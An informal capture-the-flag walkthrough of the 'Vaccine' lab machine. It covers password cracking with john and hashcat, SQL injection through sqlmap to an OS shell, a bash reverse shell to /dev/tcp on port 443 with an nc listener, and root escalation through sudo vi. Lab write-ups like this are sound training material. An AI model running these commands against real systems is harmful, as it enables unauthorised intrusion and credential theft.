 Vaccine   

used nmap -p- -sV -sC to get all the services running in all the ports and found an http,ssh and ftp   accessed the ftp server using the anonymous username and found a “backup.zip” file in the ftp server   used get {filename} to download the file and when I tried to extract the file name it was password protected, now I am kinda stuck, lets see    had to resort to some wisdom from chatgpt - 
used “john2zip backup.zip > backup.hash” to convert to hash so we can crack using “john —wordlist = ‘path to rockyou’ backup.hash”   disclaimer : if the archive had different passwords for each file this wont work  

got the password : [REDACTED] 
 extracted the backup.zip, got the files - index.php and style.css    I open the index.php and the username  “admin” and password “[REDACTED]” is present which is a hash it seems   we can get what type of hash it uses using “hashid” and returns too many hash algos    we assume its md5 since its 32bit so we use hashcat ”hashcat -a 0 -m 0 password.hash /usr/share/wordlists/rockyou.txt.gz”  here “-a 0” to specify to run in straight mode like directly take password from wordlist hash it using md5 which we specified using “-m 0”   and the password is [REDACTED],   now will try this password for the http server that we found running , logged in and stuck again - there is a search functionality which we might be able to exploit    tried passing special characters to see if we can see any sql query errors - and we do - ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%'%' ^  sql injection alert and this seems to be a postgresql server since its using “ilike”    we will use sqlmap for this : sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=[REDACTED]"  this confirms that search is vulnerable and we have dba rights so when we add additionally —os-shell it gives us shell access 

dont forget you will only get access to os shell if you have database admin rights    now since we have shell access we will run -  bash -c "bash -i >& /dev/tcp/{myip}/443 0>&1" bash -c to specify a bash command and bash -i to start a interactive session with our 443 port and >&1 to pass all input and output to the same connection   sudo nc -lvnp 443 - to open our 443 port 

we are gonna check var/www/html path for any hardcoded php files which might contain the db password 

found the password : [REDACTED],  the shell dies frequently so now using ssh we connect like ssh postgres@ipaddress and give the password we found  
in there when I cd I found the user flag - [redacted]

and run sudo -l to list our privileges and we find this : User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf    and vi is a text editor and if we open this file using vi the when we use esc and type :!bash - boom we got root shell access and we find the system flag   - [redacted]
  
   

